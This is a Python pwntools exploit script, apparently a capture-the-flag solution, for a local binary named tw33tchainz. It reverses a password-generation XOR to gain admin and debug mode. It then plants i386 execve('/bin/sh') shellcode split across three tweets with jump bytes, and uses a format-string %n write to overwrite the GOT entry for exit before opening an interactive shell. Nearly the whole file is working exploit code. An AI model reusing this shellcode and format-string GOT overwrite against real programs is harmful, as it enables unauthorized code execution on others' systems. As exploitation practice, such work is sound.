#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import textwrap

# Set up pwntools for the correct architecture
context.update(arch='i386')
context.terminal = ['tmux', 'splitw', '-h']
exe = './tw33tchainz'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break main
break print_exit
break view_chainz
set follow-fork-mode child
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#Initial Prompt
"""
Enter Username: 
A
Enter Salt: 
A
Generated Password:
e886f7d2263aacc0c830e9c94b67ee23
"""
print("Entering username and salt")
user = ("A"*14)+'\n'
salt = ("A"*14)+'\n'

io = start()
io.send(user)
io.send(salt)
io.recvuntil('Generated Password:\n')
password = (io.recvline().decode('utf-8'))
#print(password)
#print(bytes.fromhex(password))
#Password algorithm
"""
while (local_8 < 0x10) {}
    uParm1 = (uint)(byte)user[local_8] ^
             (uint)(byte)secretpass[local_8] + (uint)(byte)user[local_8 + 0x10];
    *(undefined *)(local_8 + param_1) = (char)uParm1;
    local_8 = local_8 + 1;
"""
password = bytes.fromhex(password)
#print(hexdump(user))
#print(hexdump(password))

secretpass = ''

#Generated pass is spit out in 8 bytes, so this is rearranged, hacky solution
user = "A"*12+'\x00'+'\x0a'+"A"*2
salt = "A"*12+'\x00'+'\x0a'+"A"*2

print("Calculating secret pass...")
for user_char,salt_char,pass_char in zip(user,salt,password):
    #print("%s %s %s" % (user_char,salt_char,pass_char))
    secretpass += hex(((ord(user_char) ^ pass_char) - ord(salt_char)) &
                      0xFF)[2:].zfill(2)
    #print(hexdump(secretpass))
#secretpass += hex(((0 ^ pass_char) - 0) &
#                  0xFF)[2:].zfill(2)
#print(secretpass)
secretpass_words = textwrap.wrap(secretpass, 8)
secretpass = b''
for word in secretpass_words:
    secretpass += bytes.fromhex(word)[::-1]

#print(hexdump(secretpass))

#Entering secret pass to get admin
print("Entering secret passs..")
io.sendline("")
io.sendline("3")
io.sendline(secretpass)

#Enter debug mode
print("Entering debug mode..")
io.sendline("6")
io.sendline("")

#Write shellcode to tweets
tweets = []
tweets.append([
'push 0x68',
'push 0x732f2f2f',
'push 0x6e69622f',
'mov ebx, esp',
#TODO: jmp forward, 14 bytes length
])
tweets.append([
'push 0x1010101',
'xor dword ptr [esp], 0x1016972',
'xor ecx, ecx'
#TODO: jmp forward, 14 bytes length
])
tweets.append([
'push ecx',
'push 4',
'pop ecx',
'add ecx, esp',
'push ecx',
'mov ecx, esp',
'xor edx, edx',
'push SYS_execve',
'pop eax',
'int 0x80',
#16 bytes length
])

print("Sending shellcode..")
#for tweet in tweets:
io.sendline("1")
io.sendline(asm('\n'.join(tweets[0]))+bytes.fromhex('eb30'))
io.sendline("")
io.sendline("1")
io.sendline(asm('\n'.join(tweets[1]))+bytes.fromhex('eb30'))
io.sendline("")
io.sendline("1")
io.sendline(asm('\n'.join(tweets[2])))
io.sendline("")

print("Receiving address..")
io.sendline("2")
io.recvuntil("Address: ")
payload_address = io.recvline().decode('utf-8').strip()[2:]
print(payload_address)
#print(p32(int(payload_address,16)))
io.sendline()

print("Calculating format string..")
#Take last 4 bytes and first 4 bytes, calculate decimal
#firstpart, secondpart = string[:len(string)//2], string[len(string)//2:]
high_bytes, low_bytes = payload_address[:len(payload_address)//2], payload_address[len(payload_address)//2:]
print(f"{high_bytes}, {low_bytes}")
high_bytes = int(high_bytes,16)
low_bytes = int(low_bytes,16)
print(f"{high_bytes}, {low_bytes}")


#Format String Exploit
print("Exploiting format string..")
write_address = p32(0x804d03c) #GOT Entry for Exit
#Overwriting GOT Entry
#Subtract 5 from %__ x

io.sendline("1")
io.send(" ")
io.send(write_address)
#io.send("%34952x")
io.send(f"%{low_bytes-5}x")
io.sendline("%8$n")
io.sendline("")

io.sendline("1")
io.send(" ")
io.send(p32(0x804d03c+0x2)) #Error is here because it writes 0xa to the output
io.send(f"%{high_bytes-5}x")
io.sendline("%8$n")
io.sendline("")


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
#
io.interactive()
